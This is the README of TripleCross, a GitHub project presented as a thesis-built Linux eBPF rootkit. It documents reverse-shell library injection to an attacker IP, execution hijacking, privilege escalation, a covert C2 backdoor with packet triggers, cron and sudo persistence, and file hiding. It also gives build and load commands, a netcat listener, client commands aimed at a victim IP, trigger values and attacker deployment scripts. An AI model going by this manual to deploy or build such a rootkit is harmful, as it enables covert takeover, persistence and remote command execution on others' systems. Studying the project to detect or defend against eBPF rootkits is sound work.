# TripleCross
![License](https://img.shields.io/github/license/h3xduck/TripleCross)
![GitHub release (latest by date including pre-releases)](https://img.shields.io/github/v/release/h3xduck/TripleCross?include_prereleases)
![Maintainability](https://img.shields.io/static/v1?label=maintainability&message=B&color=green)
![GitHub last commit](https://img.shields.io/github/last-commit/h3xduck/TripleCross)

TripleCross is a Linux eBPF rootkit that demonstrates the offensive capabilities of the eBPF technology.

## Features
1. A **library injection** module to execute malicious code by writing at a process' virtual memory.
2. An **execution hijacking** module that modifies data passed to the kernel to execute malicious programs.
3. A **local privilege escalation** module that allows for running malicious programs with root privileges.
4. A **backdoor with C2** capabilities that can monitor the network and execute commands sent from a remote rootkit client. It incorporates multiple activation triggers so that these actions are transmitted stealthy.
5. A **rootkit client** that allows an attacker to establish 3 different types of shell-like connections to send commands and actions that control the rootkit state remotely.
6. A **persistence** module that ensures the rootkit remains installed maintaining full privileges even after a reboot event.
7. A **stealth** module that hides rootkit-related files and directories from the user.

TripleCross is inspired by previous implant designs in this area, notably the works of Jeff Dileo at DEFCON 27[^1], Pat Hogan at DEFCON 29[^2], and Guillaume Fournier and Sylvain Afchain also at DEFCON 29[^3]. We reuse and extend some of the techniques pioneered by these previous explorations of the offensive capabilities of eBPF technology.

[^1]: J. Dileo. Evil eBPF: Practical Abuses of an In-Kernel Bytecode Runtime. DEFCON 27. [slides](https://raw.githubusercontent.com/nccgroup/ebpf/master/talks/Evil_eBPF-DC27-v2.pdf)
[^2]: P. Hogan. Warping Reality: Creating and Countering the Next Generation of Linux Rootkits using eBPF. DEFCON 27. [presentation](https://www.youtube.com/watch?v=g6SKWT7sROQ)
[^3]: G. Fournier and S. Afchain. eBPF, I thought we were friends! DEFCON 29. [slides](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Guillaume%20Fournier%20Sylvain%20Afchain%20Sylvain%20Baubeau%20-%20eBPF%2C%20I%20thought%20we%20were%20friends.pdf)


## TripleCross overview
The following image illustrates the architecture of the TripleCross system and its modules.

<img src="docs/images/rootkit.png" float="left">

This rootkit has been created for my bachelor thesis work. Comprehensive information about the rootkit functionality and sources can be visited at the [original document](https://github.com/h3xduck/TripleCross/blob/master/docs/ebpf_offensive_rootkit_tfg.pdf).

The raw sockets library RawTCP_Lib used for rootkit transmissions is of my authorship and can be visited at [its own repository](https://github.com/h3xduck/RawTCP_Lib).

The following table describes the main source code files and directories to ease its navigation:
| MAKEFILE  | COMMAND |
| ------------- | ------------- |
| docs  | Original thesis document |
| src/client | Source code of rootkit client |
| src/client/lib | RawTCP_Lib shared library |
| src/common | Constants and configuration for the rootkit. It also includes the implementation of elements common to the eBPF and user space side of the rootkit, such as the ring buffer |
| src/ebpf | Source code of the eBPF programs used by the rootkit |
| src/helpers | Includes programs for testing rootkit modules functionality, and the malicious program and library used at the execution hijacking and library injection modules respectively |
| src/libbpf | Contains the libbpf library, integrated with the rootkit|
| src/user | Source code of the user land programs used by the rootkits|
| src/vmlinux |  Headers containing the definition of kernel data structures (this is the recommended method when using libbpf) |


## Disclaimer
This rookit is **purely for educational and academic purposes**. The software is provided "as is" and the authors are not responsible for any damage or mishaps that may occur during its use.

Do not attempt to use TripleCross to violate the law. Misuse of the provided software and information may result in criminal charges.

## Table of Contents
1. [Build and Install](#build-and-install)
2. [Library injection module](#library-injection-module)
3. [Backdoor and C2](#backdoor-and-c2)
4. [Execution hijacking module](#execution-hijacking-module)
5. [Rootkit persistence](#rootkit-persistence)
6. [Rootkit stealth](#rootkit-stealth)

### Build and Install
#### Compilation
The rootkit source code is compiled using two Makefiles.
```
# Build rootkit
cd src
make all
# Build rootkit client
cd client
make
```
The following table describes the purpose of each Makefile in detail:

| MAKEFILE  | COMMAND | DESCRIPTION | RESULTING FILES |
| ------------- | ------------- | ------------- | ------------- |
| src/client/Makefile  | make  | Compilation of the rootkit client | src/client/injector |
| src/Makefile  | make help  | Compilation of programs for testing rootkit functionalities, and the malicious program and library of the execution hijacking and library injection modules respectively | src/helpers/simple_timer, src/helpers/simple_open, src/helpers/simple_execve, src/helpers/lib_injection.so, src/helpers/execve_hijack |
| src/Makefile | make kit | Compilation of the rootkit using the libbpf library | src/bin/kit |
| src/Makefile | make tckit | Compilation of the rootkit TC egress program | src/bin/tc.o |

### Installation
Once the rootkit files are generated under src/bin/, the *tc.o* and *kit* programs must be loaded orderly. In the following example the rootkit backdoor will operate in the network interface *enp0s3*:
```
// TC egress program
sudo tc qdisc add dev enp0s3 clsact
sudo tc filter add dev enp0s3 egress bpf direct - action obj bin/tc.o sec classifier/egress
// Libbpf-powered rootkit
sudo ./bin/kit -t enp0s3
```

### Attack scenario scripts
There exist two scripts *packager&#46;sh* and *deployer&#46;sh* that compile and install the rootkit automatically, just as an attacker would do in a real attack scenario. 

* Executing packager&#46;sh will generate all rootkit files under the *apps/* directory.

* Executing deployer&#46;sh will install the rootkit and create the persistence files.

These scripts must first be configurated with the following parameters for the proper functioning of the persistence module:
| SCRIPT | CONSTANT | DESCRIPTION |
| ------------- | ------------- | ------------- |
| src/helpers/deployer.sh | CRON_PERSIST | Cron job to execute after reboot |
| src/helpers/deployer.sh | SUDO_PERSIST | Sudo entry to grant password-less privileges |

## Library injection module
The rootkit can hijack the execution of processes that call the *sys_timerfd_settime* or *sys_openat* system calls. This is done by overwriting the value of the .GOT section of the process making the call.

The malicious library (src/helpers/injection_lib) will be run and aftwerwards the flow of execution returns to the original function. The library will spawn a simple reverse shell to which the attacker machine can be listening.

You can check this functionality with two test programs *src/helpers/simple_timer.c* and *src/helpers/simple_open.c*. Alternatively you may attempt to hijack any system process (tested and working with systemd).

The module configuration is set via the following constants:

| FILENAME | CONSTANT | DESCRIPTION |
| ------------- | ------------- | ------------- |
| src/common/constants.h | TASK_COMM_NAME_INJECTION_<br>TARGET_TIMERFD_SETTIME | Name of process to hijack at syscall sys_timerfd_settime |
| src/common/constants.h | TASK_COMM_NAME_INJECTION_<br>TARGET_OPEN | Name of process to hijack at syscall sys_openat |
| src/helpers/injection_lib.c| ATTACKER_IP & ATTACKER_PORT| IP address and port of attacker machine|

Receiving a reverse shell from the attacker machine can be done with netcat:
```
nc -nlvp <ATTACKER_PORT>
```

## Backdoor and C2
The backdoor works out of the box without any configuration needed. The backdoor can be controlled remotely using the rootkit client program:

| CLIENT ARGUMENTS | ACTION DESCRIPTION |
| ------------- | ------------- |
| ./injector -c \<Victim IP\> | Spawns a plaintext pseudo-shell by using the execution hijacking module |
| ./injector -e \<Victim IP\> | Spawns an encrypted pseudo-shell by commanding the backdoor with a pattern-based trigger |
./injector -s \<Victim IP\> | Spawns an encrypted pseudo-shell by commanding the backdoor with a multi-packet trigger (of both types) |
./injector -p \<Victim IP\> | Spawns a phantom shell by commanding the backdoor with a pattern-based trigger |
./injector -a \<Victim IP\> | Orders the rootkit to activate all eBPF programs |
./injector -u \<Victim IP\> | Orders the rootkit to detach all of its eBPF programs |
./injector -S \<Victim IP\> | (Simple PoC) Showcases how the backdoor can hide a message from the kernel |
| ./injector -h | Displays help |

### Backdoor triggers

Actions are sent to the backdoor using backdoor triggers, which indicate the backdoor the action to execute depending on the value of the attribute **K3**:

| K3 VALUE | ACTION |
| ------------- | ------------- |
| 0x1F29 | Request to start an encrypted pseudo-shell connection |
| 0x4E14 | Request to start a phantom shell connection |
| 0x1D25 | Request to load and attach all rootkit eBPF programs |
| 0x1D24 | Request to detach all rootkit eBPF programs (except the backdoor’s) |


#### Pattern-based trigger
This trigger hides the command and client information so that it can be recognized by the backdoor, but at the same time seems random enough for an external network supervisor. It is based on the trigger used by the NSA rootkit [Bvp47](https://www.pangulab.cn/files/The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en.pdf).

<img src="docs/images/packet_examples_bvp47_trigger.png" float="left">

#### Multi-packet trigger
This trigger consists of multiple TCP packets on which the backdoor payload is hidden in the packet headers. This is based on the [Hive](https://wikileaks.org/vault7/document/hive-DevelopersGuide/hive-DevelopersGuide.pdf) implant leaked by WikiLeaks. The following payload is used:

<img src="docs/images/packet_examples_hive_data.png" float="left">

A rolling XOR is then computed over the above payload and it is divided into multiple parts, depending on the mode selected by the rootkit client. TripleCross supports payloads hidden on the TCP sequence number:

<img src="docs/images/packet_examples_hive_seqnum.png" float="left">

And on the TCP source port:

<img src="docs/images/packet_examples_hive_srcport.png" float="left">

### Backdoor pseudo-shells
The client can establish rootkit pseudo-shells, a special rootkit-to-rootkit client connections which simulate a shell program, enabling the attacker to execute Linux commands remotely and get the results as if it was executing them directly in the infected machine.

#### Plaintext pseudo-shell
This shell is generated after a successful run of the execution hijacking module, which will execute a malicious file that establishes a connection with the rootkit client as follows:

<img src="docs/images/ups_transmission.png" float="left">
<img src="docs/images/sch_sc_execution_hijack_simple_execve_rc.png" float="right">

#### Encrypted pseudo-shell
An encrypted pseudo-shell can be requested by the rootkit client at any time. It is managed by the backdoor, and accepts either pattern-based triggers or both types of multi-packet trigger:
<img src="docs/images/sch_sc_eps_srcport.png" float="left">
<img src="docs/images/sch_sc_eps_rc.png" float="right">

#### Phantom shell
A phantom shell uses a combination of XDP and TC programs to overcome eBPF limitations at the network (it cannot generate new packets) to modify existing traffic so that it fits the C2 functionality using the following protocol (without losing original packets):
<img src="docs/images/c2_summ_example.png" float="left">

Therefore phantom shell is requested by the rootkit client which issues a command to be executed by the backdoor:

<img src="docs/images/sch_sc_phantom_1.png" float="left">

After the infected machine sends any TCP packet, the backdoor overwrites it and the client shows the response:

<img src="docs/images/sch_sc_phantom_2.png" float="left">


## License
The TripleCross rootkit and the rootkit client are licensed under the GPLv3 license. See [LICENSE](https://github.com/h3xduck/TripleCross/blob/master/LICENSE).

The [RawTCP_Lib](https://github.com/h3xduck/RawTCP_Lib) library is licensed under the MIT license.

The original thesis document and included figures are released under [Creative Commons BY-NC-ND 4.0](https://creativecommons.org/licenses/by-nc-nd/4.0/).


